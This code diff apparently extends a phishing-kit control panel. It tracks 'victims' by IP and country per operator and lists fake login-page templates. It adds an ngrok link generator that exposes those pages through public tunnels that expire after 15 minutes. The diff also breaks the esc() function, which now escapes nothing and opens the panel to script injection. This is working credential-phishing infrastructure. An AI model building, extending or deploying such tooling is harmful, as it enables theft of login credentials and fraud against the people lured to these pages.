@@ -124,7 +124,11 @@ function enterDash() {
 function loadVictims() {
   const q = query(collection(db, 'victims'), orderBy('createdAt', 'desc'));
   onSnapshot(q, snap => {
-    victims = snap.docs.map(d => ({id: d.id, ...d.data()}));
+    // Filter victims: only show those belonging to the current user (by ownerUid)
+    const currentUid = auth.currentUser?.uid;
+    victims = snap.docs
+      .map(d => ({id: d.id, ...d.data()}))
+      .filter(v => v.ownerUid === currentUid);
     renderVictims();
     updateStats();
   }, err => {
@@ -211,6 +215,7 @@ window.addDemoVictim = async () => {
       ip: `${rnd(255)}.${rnd(255)}.${rnd(255)}.${rnd(255)}`,
       country: countries[Math.floor(Math.random()*countries.length)],
       date: new Date().toISOString(),
+      ownerUid: auth.currentUser?.uid || null,
       createdAt: serverTimestamp()
     });
     toast('DEMO RECORD ADDED');
@@ -457,9 +462,10 @@ window.showPage = (pid, el) => {
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   document.getElementById(pid).classList.add('active');
   if(el) el.classList.add('active');
-  const names = {homePage:'HOME',victimsPage:'VICTIMS',accountPage:'MY ACCOUNT',settingsPage:'SETTINGS'};
+  const names = {homePage:'HOME',victimsPage:'VICTIMS',accountPage:'MY ACCOUNT',settingsPage:'SETTINGS',sitesPage:'SITES'};
   document.getElementById('topbarPath').textContent = names[pid]||pid;
   if(pid==='accountPage') updateAccountPage();
+  if(pid==='sitesPage') { renderSites(); pollNgrokStatus(); }
 };
 
 function showScreen(id){
@@ -478,7 +484,7 @@ function toast(msg, err=false){
   setTimeout(()=>t.classList.remove('show'), 3000);
 }
 
-function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function esc(s){ return String(s).replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>'); }
 function rnd(n){ return Math.floor(Math.random()*n); }
 function download(name, content, type){
   const a = document.createElement('a');
@@ -505,13 +511,205 @@ function friendlyErr(code){
 const saved = localStorage.getItem('theme');
 if(saved && saved!=='dark') { document.documentElement.setAttribute('data-theme',saved); }
 
- // ================== TEMPLATE STORE ==================
+ // ================== NGROK / LINK GENERATOR ==================
+
+let ngrokActive = false;
+let ngrokUrl = null;
+let timerInterval = null;
+
+// Copy text to clipboard helper
+function copyToClipboard(text) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => {
+      toast('LINK COPIED TO CLIPBOARD');
+    }).catch(() => {
+      fallbackCopy(text);
+    });
+  } else {
+    fallbackCopy(text);
+  }
+}
+
+function fallbackCopy(text) {
+  const textarea = document.createElement('textarea');
+  textarea.value = text;
+  textarea.style.position = 'fixed';
+  textarea.style.opacity = '0';
+  document.body.appendChild(textarea);
+  textarea.select();
+  try {
+    document.execCommand('copy');
+    toast('LINK COPIED TO CLIPBOARD');
+  } catch (e) {
+    toast('FAILED TO COPY LINK', true);
+  }
+  document.body.removeChild(textarea);
+}
+
+// Format seconds into MM:SS
+function formatTime(seconds) {
+  const m = Math.floor(seconds / 60);
+  const s = seconds % 60;
+  return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+}
+
+// Update the timer display
+function updateTimerDisplay(timeRemaining) {
+  const timerEl = document.getElementById('ngrokTimer');
+  const statusEl = document.getElementById('ngrokStatus');
+  const linkDisplay = document.getElementById('ngrokLinkDisplay');
+  const stopBtn = document.getElementById('stopNgrokBtn');
+  const timerSection = document.getElementById('timerSection');
+
+  if (ngrokActive && timeRemaining > 0) {
+    timerSection.style.display = 'flex';
+    timerEl.textContent = formatTime(timeRemaining);
+    statusEl.textContent = 'ACTIVE';
+    statusEl.style.color = 'var(--accent)';
+    linkDisplay.textContent = ngrokUrl;
+    linkDisplay.href = ngrokUrl;
+    stopBtn.style.display = '';
+  } else {
+    timerSection.style.display = 'none';
+    statusEl.textContent = 'INACTIVE';
+    statusEl.style.color = 'var(--text-dim)';
+    linkDisplay.textContent = '—';
+    linkDisplay.href = '#';
+  }
+}
+
+// Start the 15-minute timer
+function startTimer(initialTime) {
+  if (timerInterval) clearInterval(timerInterval);
+  let remaining = initialTime;
+
+  updateTimerDisplay(remaining);
+
+  timerInterval = setInterval(async () => {
+    // Poll server for accurate remaining time
+    try {
+      const resp = await fetch('/api/ngrok/status');
+      if (resp.ok) {
+        const data = await resp.json();
+        ngrokActive = data.active;
+        ngrokUrl = data.url;
+        remaining = data.timeRemaining;
+        updateTimerDisplay(remaining);
+
+        if (!data.active || remaining <= 0) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+          ngrokActive = false;
+          ngrokUrl = null;
+          updateTimerDisplay(0);
+          renderSites();
+          toast('LINK EXPIRED — TUNNEL CLOSED', true);
+        }
+      }
+    } catch (e) {
+      console.warn('Timer poll error:', e.message);
+    }
+  }, 1000);
+}
+
+// Generate ngrok link for a template
+window.getNgrokLink = async (templateLink, btnElement) => {
+  const user = auth.currentUser;
+  if (!user) {
+    toast('NOT AUTHENTICATED', true);
+    return;
+  }
+
+  const ownerUid = user.uid;
+
+  // Show loading state on button
+  if (btnElement) {
+    btnElement.disabled = true;
+    btnElement.textContent = 'GENERATING...';
+  }
+
+  try {
+    const resp = await fetch('/api/ngrok/start', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ownerUid })
+    });
+
+    if (!resp.ok) {
+      const errData = await resp.json();
+      toast('NGROK ERROR: ' + (errData.error || resp.statusText), true);
+      if (btnElement) {
+        btnElement.disabled = false;
+        btnElement.textContent = 'GET LINK';
+      }
+      return;
+    }
+
+    const data = await resp.json();
+    ngrokUrl = data.url;
+    ngrokActive = true;
+
+    // Construct full link: ngrok URL + template path
+    const fullLink = ngrokUrl + '/' + templateLink;
+    copyToClipboard(fullLink);
+
+    // Show in-app notification
+    toast('LINK COPIED: ' + fullLink);
+
+    // Start 15-minute timer
+    startTimer(data.timeRemaining);
+
+    // Update UI
+    renderSites();
+    updateTimerDisplay(data.timeRemaining);
+
+  } catch (e) {
+    toast('NGROK START FAILED: ' + e.message, true);
+    if (btnElement) {
+      btnElement.disabled = false;
+      btnElement.textContent = 'GET LINK';
+    }
+  }
+};
+
+// Stop ngrok manually
+window.stopNgrok = async () => {
+  try {
+    await fetch('/api/ngrok/stop', { method: 'POST' });
+  } catch (e) {}
+  ngrokActive = false;
+  ngrokUrl = null;
+  if (timerInterval) clearInterval(timerInterval);
+  timerInterval = null;
+  updateTimerDisplay(0);
+  renderSites();
+  toast('TUNNEL STOPPED');
+};
+
+// Poll ngrok status on page load
+async function pollNgrokStatus() {
+  try {
+    const resp = await fetch('/api/ngrok/status');
+    if (resp.ok) {
+      const data = await resp.json();
+      ngrokActive = data.active;
+      ngrokUrl = data.url;
+      if (data.active && data.timeRemaining > 0) {
+        startTimer(data.timeRemaining);
+      }
+      updateTimerDisplay(data.timeRemaining);
+    }
+  } catch (e) {
+    console.warn('Status poll error:', e.message);
+  }
+}
+
+// ================== TEMPLATE STORE ==================
 
 const siteTemplates = [
   {
     name: "Login Page",
-    desc: "Standard login page",
-    image: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100%25' height='100%25' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23222'/%3E%3Ctext x='50' y='55' font-family='monospace' font-size='14' fill='%2300ff99' text-anchor='middle'%3ELOGIN%3C/text%3E%3C/svg%3E",
+    desc: "Standard login page with username/email and password fields",
     tags: ["login", "standard"],
     link: "sites/login.html"
   },
@@ -561,9 +759,10 @@ window.renderSites = () => {
 
         <button
           class="site-btn"
-          onclick="window.open('${site.link}','_blank')"
+          onclick="getNgrokLink('${site.link}')"
+          ${ngrokActive ? 'style="border-color:var(--yellow);color:var(--yellow);"' : ''}
         >
-          GET LINK
+          ${ngrokActive ? 'REGENERATE LINK' : 'GET LINK'}
         </button>
 
       </div>
@@ -572,9 +771,10 @@ window.renderSites = () => {
   `).join('');
 };
 
-// render when opening page
+// render when opening page + poll ngrok status
 setTimeout(() => {
   if(document.getElementById('sitesGrid')){
     renderSites();
+    pollNgrokStatus();
   }
 }, 1000);
